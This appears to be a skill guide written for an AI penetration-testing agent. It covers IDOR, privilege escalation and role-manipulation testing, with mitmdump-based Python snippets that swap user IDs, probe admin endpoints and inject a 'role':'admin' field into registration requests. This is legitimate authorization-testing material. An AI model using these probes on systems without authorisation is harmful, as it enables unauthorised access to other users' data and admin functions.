# Lateral Movement & Authorization Testing

## When to Use

Use this skill when you have authenticated access and MUST test what a user can reach
beyond their intended scope. This covers IDOR, privilege escalation, and access control
boundary testing.

## IDOR Testing Pattern

IDOR (Insecure Direct Object Reference) occurs when the application uses user-supplied
identifiers to access objects without verifying the requesting user owns them.

### Step 1: Identify Resource Endpoints

Look for endpoints with numeric or UUID identifiers:
- `/api/Users/{id}`
- `/api/Orders/{id}`
- `/api/Documents/{id}`
- `/api/Profiles/{id}`

### Step 2: Establish Baseline

```python
# Authenticate as User A
login_resp = await mitmdump(f"-nr {mitm_file} --flow-detail 3 -B '~u /login & ~m POST'")
# Extract token/cookie from response

# Access User A's own resource
own_resource = await mitmdump(f"-nr {mitm_file} --flow-detail 3 -B '~u /api/Users/1'")
print(f"Own resource access: {own_resource}")
```

### Step 3: Cross-User Access

```python
# Try accessing User B's resource with User A's credentials
# Modify the ID in the path
cross_access = await mitmdump(
    f"-nr {mitm_file} --map-remote '|/api/Users/1|/api/Users/2|' --flow-detail 3"
)
print(f"Cross-user access result: {cross_access}")
# If 200 with User B's data -> IDOR confirmed
```

## Privilege Escalation Testing

### Vertical Escalation

Test if a regular user can access admin endpoints:

```python
admin_endpoints = ["/api/admin", "/admin/users", "/api/Users/all",
                   "/api/config", "/api/settings"]
for ep in admin_endpoints:
    resp = await mitmdump(f"-nr {mitm_file} --flow-detail 3 -B '~u {ep}'")
    if "200" in resp:
        print(f"ESCALATION: {ep} accessible with regular user creds")
```

### Horizontal Escalation

Test if User A can perform User B's actions:
1. Create/modify resources belonging to other users
2. Access other users' private data
3. Perform actions on behalf of other users

## Role Manipulation

```python
# If registration allows role parameter:
# Replay registration with modified role field
modified = await mitmdump(
    f"-nr {mitm_file} --modify-body '/~q & ~u /register/{{\"role\":\"admin\"}}/' --flow-detail 3"
)
```

## Access Control Checklist

For each protected resource, verify:
- [ ] Cannot access without authentication (returns 401/403)
- [ ] Cannot access other users' resources (IDOR check)
- [ ] Cannot escalate to admin role
- [ ] Cannot modify other users' data
- [ ] Rate limiting prevents brute-force enumeration
- [ ] Deleted/disabled users cannot access resources

## Evidence Requirements

For each finding, you MUST provide:
1. The exact request that succeeded when it should have failed
2. The response status code and relevant body content
3. Which user's credentials were used
4. Which user's resource was accessed
5. Why this constitutes a security boundary violation
